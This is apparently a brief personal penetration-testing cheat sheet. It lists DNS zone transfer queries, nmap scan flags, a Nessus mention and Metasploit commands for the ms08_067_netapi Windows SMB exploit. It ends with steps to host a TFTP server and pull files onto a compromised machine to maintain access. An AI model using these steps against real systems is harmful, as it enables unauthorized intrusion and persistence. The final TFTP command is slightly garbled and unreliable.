DNS zone transfer attack
need to know about the name server

[nslookup]
	set type=ns
	abcd.com
[host -l domain_name name_server]
[host -l abcd.com nameserverABCD.com]

Nmap scan
[nmap -sS ip_addr] - half open scan - stop the threeway handshake
[nmap -sT ip] - full scan - complete threeway handshake
[nmap -sU ip] - udp scan
-sX - xmas scan
-sN - null scan
-sF - fin scan
-sA - tcp ACK scan

NESSAS
vulnerability scan using nessas. 

Metasploit
search ms08_067
use exploit/windows/smb/ms08_067_netapi

maintain access
/tmp will the folder of the TFTP services from where we can send and upload the files.
[atftpd --daemon --port 69 /tmp] - creating TFTP service
[netstat -an | grep 69] - make sure its listening
[tftpd ip get net.exe] - download from this TFTP service